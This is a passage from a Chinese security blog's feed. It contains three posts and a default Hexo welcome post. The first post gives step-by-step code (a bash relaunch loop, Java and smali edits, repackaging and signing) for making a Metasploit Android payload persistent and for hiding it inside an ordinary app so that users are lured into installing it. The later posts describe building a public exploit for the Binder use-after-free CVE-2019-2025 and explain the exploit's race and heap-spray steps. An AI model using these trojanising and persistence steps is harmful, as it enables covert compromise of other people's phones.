title="二、稳定性增强版"></a>二、稳定性增强版</h2><p>目前，解决稳定性问题最普遍的方法是，在建立连接后，迅速将以下脚本复制到Android设备上，并执行：</p><p><code>#!/bin/bash</code><br><strong><code>while</code></strong><code>true</code><br><strong><code>do</code></strong><code>am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity</code><br><code>sleep 20</code><br><strong><code>done</code></strong></p><p>即定时重启Payload应用程序。但是，在没有root的设备上执行脚本会有权限错误。。。。因此，考虑修改Payload应用程序的源码。</p><p>反编译该apk文件，得到启动payload的关键代码：</p><p><em>MainActivity.java:</em><br><code>protected void onCreate(Bundle arg1) {super.onCreate(arg1);MainService.startService(((Context)this));this.finish();}</code></p><p><em>MainService.java:</em><br><code>public int onStartCommand(Intent arg2, int arg3, int arg4) {Payload.start(((Context)this));return 1;}</code></p><p>可以看到在MainService类的onStartCommand方法中启动了Payload。</p><p>思路一是重写MainService的onDestroy方法，在这个方法中加入启动Payload的代码。但是，payload连接断开时，MainService服务并没有结束，不会调用onDestroy方法，这里行不通。</p><p>思路二是通过在onStartCommand方法中添加AlarmManager定时器，定时执行payload，保证payload一直连接。即将onStartCommand方法修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public int onStartCommand(Intent intent, int flags, int startId) &#123; Payload.start(this); </span><br><span class="line">AlarmManager manager &#x3D; (AlarmManager) getSystemService(ALARM_SERVICE); </span><br><span class="line">int restarttime &#x3D; 60 * 1000; &#x2F;&#x2F; one minute </span><br><span class="line">long triggerAtTime &#x3D; SystemClock.elapsedRealtime() + restarttime; </span><br><span class="line">Intent i &#x3D; new Intent(&quot;METASPLOIT&quot;); </span><br><span class="line">PendingIntent pi &#x3D; PendingIntent.getBroadcast(this, 0, i, 0); manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi); </span><br><span class="line">return START_STICKY; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的修改反编译的smali代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.method public onStartCommand(Landroid&#x2F;content&#x2F;Intent;II)I .locals 7 invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;Payload;-&gt;start(Landroid&#x2F;content&#x2F;Context;)V const-string v0, &quot;alarm&quot; </span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;getSystemService(Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;Object; </span><br><span class="line">move-result-object v0 </span><br><span class="line">check-cast v0, Landroid&#x2F;app&#x2F;AlarmManager; </span><br><span class="line">.local v0, </span><br><span class="line">&quot;manager&quot;:Landroid&#x2F;app&#x2F;AlarmManager;</span><br><span class="line">const v1, 0xea60 </span><br><span class="line">.local v1, &quot;restarttime&quot;:I </span><br><span class="line">invoke-static &#123;&#125;, Landroid&#x2F;os&#x2F;SystemClock;-&gt;elapsedRealtime()J </span><br><span class="line">move-result-wide v2 </span><br><span class="line">int-to-long v4, v1 </span><br><span class="line">add-long&#x2F;2addr v2, v4 </span><br><span class="line">.local v2, &quot;triggerAtTime&quot;:J </span><br><span class="line">new-instance v4, Landroid&#x2F;content&#x2F;Intent; </span><br><span class="line">const-string v5, &quot;METASPLOIT&quot; </span><br><span class="line">invoke-direct &#123;v4, v5&#125;, Landroid&#x2F;content&#x2F;Intent;-&gt;&lt;init&gt;(Ljava&#x2F;lang&#x2F;String;)V .local v4, &quot;i&quot;:Landroid&#x2F;content&#x2F;Intent; </span><br><span class="line">const&#x2F;4 v5, 0x0 </span><br><span class="line">invoke-static &#123;p0, v5, v4, v5&#125;, Landroid&#x2F;app&#x2F;PendingIntent;-&gt;getBroadcast(Landroid&#x2F;content&#x2F;Context;ILandroid&#x2F;content&#x2F;Intent;I)Landroid&#x2F;app&#x2F;PendingIntent; </span><br><span class="line">move-result-object v5 </span><br><span class="line">.local v5, &quot;pi&quot;:Landroid&#x2F;app&#x2F;PendingIntent; </span><br><span class="line">const&#x2F;4 v6, 0x2 </span><br><span class="line">invoke-virtual &#123;v0, v6, v2, v3, v5&#125;, Landroid&#x2F;app&#x2F;AlarmManager;-&gt;set(IJLandroid&#x2F;app&#x2F;PendingIntent;)V </span><br><span class="line">const&#x2F;4 v6, 0x1 </span><br><span class="line">return v6</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>另外，需要修改MainBroadcastReceiver的onReceiver方法中的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void onReceive(Context context, Intent intent) &#123; MainService.startService(context); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的smali为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.method public onReceive(Landroid&#x2F;content&#x2F;Context;Landroid&#x2F;content&#x2F;Intent;)V .locals 0 </span><br><span class="line">invoke-static &#123;p1&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V </span><br><span class="line">return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>然后，在Manifext中的MainBroadcastReceiver模块的intent-filter中增加：<br><code>&lt;</code><strong><code>action</code></strong><code>android:name=&quot;METASPLOIT&quot; /&gt;</code></p><p>smali修改完成后执行<code>apktool apk -o apk_unsigned.apk</code>，得到重新打包的payload apk；<br>然后执行<code>jarsigner -verbose -keystore demo.keystore -signedjar apk_signed.apk apk_unsigned.apk demo.keystore</code> 对应用进行签名（需要先生成KEYSTORE文件，并将此文件放在apk_unsigned.apk同一目录下）；<br>最后将签过名的apk_signed.apk安装至目标Android设备即可。</p><p>结果：</p><ol><li>修改前和修改后的Payload应用程序均会被Android设备检测出风险，需要增加免杀；</li><li>连接依然不稳定。。。。</li></ol><h2 id="三、隐蔽性增强版"><a href="#三、隐蔽性增强版" class="headerlink" title="三、隐蔽性增强版"></a>三、隐蔽性增强版</h2><p>一开始考虑修改Payload应用程序的应用名和图标，伪装成其他应用，诱导用户安装。但是，反编译payload apk文件后，发现资源目录下没有drawable目录，无法更换图标。。。。。</p><p>只好换个思路，把payload应用程序嵌入某个普通app中。</p><p>首先，反编译两个应用。</p><ol><li>打开将Payload应用程序 的smali目录复制到普通APP的相应目录下；</li><li>打开普通APP的AndroidManifest.xml文件，将Payload应用程序 的Manifest中申请的权限复制过来；</li><li>再把Payload应用程序 的Manifest中声名的组件复制到普通APP的Manifest文件中， 注意普通应用包名和 Payload应用程序 包名不同，复制过来后需要把组件名补全 ；</li><li>在普通APP的Manifest中找到有如下intent-filter标签的Activity：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt; </span><br><span class="line"> &lt;action android:name&#x3D;&quot;android.intent.action.MAIN&quot; &#x2F;&gt;</span><br><span class="line"> &lt;category android:name&#x3D;&quot;android.intent.category.LAUNCHER&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;intent-filter&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>在smali目录中，打开上一步找到的Activity，找到onCreate方法，在第一行插入Payload服务的启动语句，如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.method protected onCreate(Landroid&#x2F;os&#x2F;Bundle;)V </span><br><span class="line">invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V </span><br><span class="line">.locals 6 </span><br><span class="line">.param p1, &quot;savedInstanceState&quot; </span><br><span class="line"># Landroid&#x2F;os&#x2F;Bundle;.............end method</span><br></pre></td></tr></table></figure><ol start="6"><li>重新打包、签名该应用。</li></ol><p>即可完成对 Payload应用程序 的伪装。但是，仍然会被设备检测出风险。</p><p>参考文献：<br>【1】 <a href="https://www.freebuf.com/sectool/141234.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/141234.html</a><br>【2】 <a href="https://www.freebuf.com/articles/terminal/188585.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/terminal/188585.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写在前面的感想：&lt;/strong&gt;做这个实验的时候，才发现一直以为的“手机不r
      
    
    </summary>
    
    
      <category term="工具配置笔记" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>复现CVE-2019-2025时踩过的坑-copy</title>
    <link href="http://yoursite.com/2020/03/26/%E5%A4%8D%E7%8E%B0CVE-2019-2025%E6%97%B6%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91-copy/"/>
    <id>http://yoursite.com/2020/03/26/%E5%A4%8D%E7%8E%B0CVE-2019-2025%E6%97%B6%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91-copy/</id>
    <published>2020-03-26T07:03:23.000Z</published>
    <updated>2020-03-26T07:32:01.807Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p>上篇文章沿着看雪论坛大神分享的思路（<a href="https://bbs.pediy.com/thread-254812.htm）分析了Android" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254812.htm）分析了Android</a> Binder的use_after_free漏洞，这篇文章记录下复现漏洞时踩过的坑。</p><p>首先，在<a href="https://github.com/jltxgcy/CVE_2019_2025_EXP下载源码。" target="_blank" rel="noopener">https://github.com/jltxgcy/CVE_2019_2025_EXP下载源码。</a></p><p>可以看到工程需要在aosp环境下编译，然后，再将编译得到的可执行文件pwn放入设备中执行。</p><p>由于Android源码的编译需要在Linux环境下执行，而我的环境是<strong>win10</strong>，解决的方法有三个：</p><p>1、使用docker</p><p>2、Linux虚拟机</p><p>3、再装一个Linux系统（win10和Linux双系统，可以想象有无数个坑，果断放弃这一种）</p><h2 id="一、使用Docker配置AOSP"><a href="#一、使用Docker配置AOSP" class="headerlink" title="一、使用Docker配置AOSP"></a>一、使用Docker配置AOSP</h2><p>首先，下载Docker for Windows并进行安装。安装完成后，启动Docker，会弹出错误提示，要求启动Hyper-V。（但是启动Hyper-V后，VMware虚拟机就打不开了。。。）  </p><p>启动Hyper-V步骤：</p><ol><li>打开控制面板，点击“程序”选项，然后选择“启动或关闭Windows功能”；</li><li>在Windows功能窗口中，找到Hyper-V，在前面打勾，点击确定；</li><li>更改完成后，根据提示，重启系统</li></ol><p>启动docker，右击任务栏右下角的docker图标，点击Ketimatic，启动桌面。然后，在搜索栏输入aosp，点击create下载。</p><p>离线下载Android源码，然后配置 aosp路径。需要先在docker的Settings中设置Shared Drivers，否则docker不能访问主机的文件。具体设置、碰到的问题和解决方法参考：<a href="https://newsn.net/say/docker-share-folder.html" target="_blank" rel="noopener">https://newsn.net/say/docker-share-folder.html</a></p><p>（设置后，依然不能从docker打开的powershell中访问程序的文件）</p><h2 id="二、使用Linux虚拟机"><a href="#二、使用Linux虚拟机" class="headerlink" title="二、使用Linux虚拟机"></a>二、使用Linux虚拟机</h2><p>这里使用的VMware，安装了Ubuntu16.04。</p><h4 id="1、下载aosp镜像"><a href="#1、下载aosp镜像" class="headerlink" title="1、下载aosp镜像"></a>1、下载aosp镜像</h4><p>官方教程地址为：<a href="https://source.android.com/setup/build/downloading。由于不能访问google官方AOSP，我们使用清华源下载。" target="_blank" rel="noopener">https://source.android.com/setup/build/downloading。由于不能访问google官方AOSP，我们使用清华源下载。</a></p><p>首先，下载repo工具。</p><figure class="highlight plain"><figcaption><span>~/binPATH</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">*epo是Google开发的用于管理Android版本库的一个工具，是用Python对Git工具做了封装，简化了复杂的百多个Git库管理。*</span><br><span class="line"></span><br><span class="line">然后，下载和同步aosp。</span><br></pre></td></tr></table></figure><ol><li>wget -c <a href="https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar</a> # 下载初始化包</li><li>tar xf aosp-latest.tar</li><li>cd AOSP # 解压得到的 AOSP 工程目录# 这时 ls 的话什么也看不到，因为只有一个隐藏的 .repo 目录</li><li>repo sync # 正常同步一遍即可得到完整目录# 或 repo sync -l 仅checkout代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">下载的aosp-latest.tar包将近60G的数据，且不能断点续传，建议选择网络稳定且网速较快的低峰时间下载。下载完成之后，解压缩，发现得到一个空的aosp目录，因为里面只有一个隐藏的.repo目录。需要同步一下才能得到完整的目录。同步的过程同样要很长的时间，耐心等待一下。。。</span><br><span class="line"></span><br><span class="line">![](aosp.PNG)</span><br><span class="line"></span><br><span class="line">### 2、编译pwn工程</span><br><span class="line"></span><br><span class="line">编译过程对性能要求比较高，虚拟机内存最好分配允许的最大内存。一开始只有8G内存，给虚拟机分配了6个G，每执行一个命令就要等半天才有反馈。后来扩展了8G，虚拟机内存分到了13.4G，速度肉眼可见的飞跃。</span><br><span class="line"></span><br><span class="line">当然了，这里我们只编译单个模块，而不是整个系统。内存只有6G的时候，尝试编译了一次整个系统，果不其然，out of memory了。</span><br><span class="line"></span><br><span class="line">下面是编译的具体过程：</span><br><span class="line"></span><br><span class="line">**1.** 进入aosp目录下, 将下载的CVE_2019_2015_EXP.zip解压至本目录；</span><br><span class="line"></span><br><span class="line">**2.** 初始化环境，执行：&#96;source build&#x2F;envsetup.sh &#96;。否则后续命令执行会报错：</span><br></pre></td></tr></table></figure>The program ‘XX’ is currently not installed.<pre><code></code></pre></li></ol><p><strong>3.</strong> 执行<code>lunch</code>，选择编译的平台。lunch命令执行后如左图， 在<a href="https://source.android.google.cn/setup/build/running查看代号对应的设备如右图：" target="_blank" rel="noopener">https://source.android.google.cn/setup/build/running查看代号对应的设备如右图：</a></p><p><img src="%E8%AE%BE%E5%A4%87%E4%BB%A3%E5%8F%B7.PNG" alt=""></p><p><img src="aosp%E8%AE%BE%E5%A4%87.PNG" alt=""></p><p><strong>4.</strong> 切换到CVE_2019_2025_EXP目录，执行<code>mm</code> 。或者在aosp目录下，直接执行<code>mm pwn</code> (pwn是模块名字)。</p><p>m、mm、mmm命令可以只编译单独模块，而不用编译整个Android系统。</p><p>经过短则几分钟，长则半小时（不同性能）的编译后，果不其然，编译失败了。。。。</p><p>不过没关系，失败是常态，第一次就成功的，才是偶然。</p><p>报错内容：</p><p><img src="%E6%8A%A5%E9%94%99.PNG" alt=""></p><p>是一个整型溢出错误，考虑到这是复现漏洞的源码，是经过复现漏洞的大神测试过的，那就只能是编译时的问题，而不是代码问题。经过一番周折（后续细说）才意识到，是lunch的时候选的编译平台有问题，默认的aosp_arm-eng是32位的，应该选64位的平台。重新执行lunch命令，选择aosp_arm64_eng，再次编译，终于成功了！</p><p><strong>一番周折：</strong></p><p>第一次编译结束，出现了整型溢出问题。而为了解决整型溢出问题导致的内存访问或内存分配关联变量中出现信息泄露，Android7.0中添加了有符号和无符号的整型溢出排错程序。于是，脑子一热，决定把源码切到Android6.0。</p><p>经过漫长的同步源码后，终于，又失败了。。。</p><p>这次的问题不再是整型溢出错误，而是/…/Android.mk：No such file or dir. 根据网上资料，尝试了几次，依次把报错的目录删掉，终于不报这个错了。 然而，万万没想到，又开始报整型溢出。。。</p><p>此时，才意识到可能是lunch的时候选的平台是32位的，而程序需要在64位的环境下编译。</p><p>于是，又把源码切回latest，重新选择64位的平台编译，这才成功。</p><p><strong>5.</strong> 执行pwn，即连接设备，使用adb push将pwn文件放在设备/data/local/tmp目录下，再执行<code>./pwn</code></p><p>然后，又报错了！</p><p>x86_64(Pixel 2):</p><p><img src="x86.PNG" alt=""></p><p>arm64(Pixel 2):</p><p><img src="arm64.PNG" alt=""></p><h3 id="3、编译exploitdb上的exp"><a href="#3、编译exploitdb上的exp" class="headerlink" title="3、编译exploitdb上的exp"></a>3、编译exploitdb上的exp</h3><p> 地址：<a href="https://www.exploit-db.com/exploits/46503" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46503</a></p><p>exp下载地址：<a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46503.zip" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46503.zip</a></p><p>注意：下载时不能挂代理，否则不能下载</p><p>根据描述，执行./complie.sh进行编译，结果又报错了。。。</p><p><img src="exp.PNG" alt=""></p><p>打开compile.sh，发现里面是一句：<code>gcc -o poc poc.c binder.c</code> 。上图中报的错都是binder.c中的一些变量或结构体找不到。找来源码中的binder.c和binder.h与这里的对比，发现只有一部分相同，emmm小小的脑袋，大大的疑惑。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上篇文章沿着看雪论坛大神分享的思路（&lt;a href=&quot;https://bbs.pediy.co
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>cve-2019-2025-copy</title>
    <link href="http://yoursite.com/2020/03/26/cve-2019-2025-copy/"/>
    <id>http://yoursite.com/2020/03/26/cve-2019-2025-copy/</id>
    <published>2020-03-26T06:15:40.000Z</published>
    <updated>2020-03-26T07:32:18.785Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞是位于Binder Driver内核空间与用户空间的client和server通信时，不同线程同步竞争调用binder_ioctl()造成的use_after_free漏洞。  </p><h2 id="一、漏洞原因"><a href="#一、漏洞原因" class="headerlink" title="一、漏洞原因"></a>一、漏洞原因</h2><h3 id="1-Binder简介"><a href="#1-Binder简介" class="headerlink" title="1.Binder简介"></a>1.Binder简介</h3><p>Binder机制是Android采用的进程间通信机制，采用了C/S架构。Client进程通过RPC与Server通信，可以简单地划分为三层，驱动层、IPC层、业务层。demo()方法是Client和Server共同协商好的统一方法；handle、RPC数据、代码、协议这4项组成了IPC层的数据，通过IPC层进行数据传输；而真正在Client和Server两端建立通信的基础设施便是Binder Driver。  </p><p>Binder driver没有直接操作硬件，只是对设备内存进行处理。主要是驱动设备的初始化（binder_init），打开（binder_open），映射（binder_mmap）,数据操作（binder_ioctl）。  </p><p>例如，当用户空间调用ioctl()方法时，通过系统调用__open()方法，最终调用binder驱动的binder_ioctl()方法。</p><p>Binder通信模型如下：  </p><p><img src="Binder1.PNG" alt=""></p><p>Binder协议包含在IPC数据中，分为两类：</p><ol><li><p>BINDER_COMMAND_PROTOCOL: Binder请求码，以“BC_”开头，用于从IPC层传递到binder driver层；</p></li><li><p>BINDER_RETURN_PROTOCOL: binder响应码，以“BR_ ”开头，用于从binder driver层传递到IPC层；</p></li></ol><p>Binder IPC通信至少是两个进程的交互：</p><ol><li>client进程执行binder_thread_write，根据BC_XXX命令，生成相应的binder_work;</li><li>server进程执行binder_thread_read, 根据binder_work.type，生成BR_XXX，发送到用户空间处理；</li></ol><h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h3><p>Server进程收到Client请求时，会进入内核，调用“binder_alloc_new_buf()”从Client进程对应的“alloc-&gt;free_buffers.rb_node”中申请一个“struct binder_buffer”对象，被申请的对象会从“alloc-&gt;free_buffers.rb_node”中移除，并链入“alloc-&gt;allocated_buffer.rb_node”。然后，为了避免“t-&gt;buffer”在使用时被释放，将“t-&gt;buffer-&gt;allow_user_free”赋值为0。  </p><p><img src="shuidi1.png" alt=""></p><p>Client进程收到Server进程发来的消息后，就会结束本次交互，释放“t-&gt;buffer”，销毁Parcel对象。攻击者可以构造满足内核校验的参数，主动向内核发送“BC_FREE_BUFFER”请求，以提前释放该“t-&gt;buffer”对象。  </p><p><img src="shuidi2.png" alt=""></p><p>从上图可知，buffer-&gt;allow_user_free是0时，Client无法释放“buffer”对象，否则将调用“binder_alloc_free_buf()”释放“buffer”。</p><p>如果Client进程能在Server进程将““t-&gt;buffer-&gt;allow_user_free”赋值为0之前就触发到“binder_alloc_free_buf()-&gt;binder_free_buf_locked()-&gt;rb_erase()”,就有可能将其从“alloc-&gt;buffers”中移除，之后再选择合适时机触发kfree()将其释放。此时当Server进程继续使用“t-&gt;buffer”时就触发了use_sfter_free问题。</p><p><img src="shuidi3.png" alt=""></p><p>这个漏洞的产生是由于2016年11月的一个补丁，将原先效率较低的保护“binder_ioctl()”的全局互斥锁优化为更加细粒度的互斥锁。  </p><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><p><a href="https://github.com/jltxgcy/CVE_2019_2025_EXP" target="_blank" rel="noopener">EXP地址： https://github.com/jltxgcy/CVE_2019_2025_EXP</a></p><p>1、提前分配binder_buffer，以供后面释放；</p><p>2、构造出：Client执行BC_FREE_BUFFER，Server进程执行BC_REPLY(binder_alloc_new_buffer)，并启动两个线程，设置竞争；</p><p>3、堆喷，实现任意地址写，向内存中写入提权脚本并执行。</p><p>由于构造Client执行BC_FREE_BUFFER和Server进程执行BC_REPLY时使用了很多framework层的接口，因此EXP需要在android源码环境下编译。</p><p>编译运行结果待续。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个漏洞是位于Binder Driver内核空间与用户空间的client和server通信时，不同线程同步竞争调用binder_ioctl()造成的use_after_free漏洞。  &lt;/p&gt;
&lt;h2 id=&quot;一、漏洞原因&quot;&gt;&lt;a href=&quot;#一、漏洞原因&quot; class
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/03/25/hello-world/"/>
    <id>http://yoursite.com/2020/03/25/hello-world/</id>
    <published>2020-03-25T09:54:37.098Z</published>
    <updated>2020-03-25T09:54:37.098Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
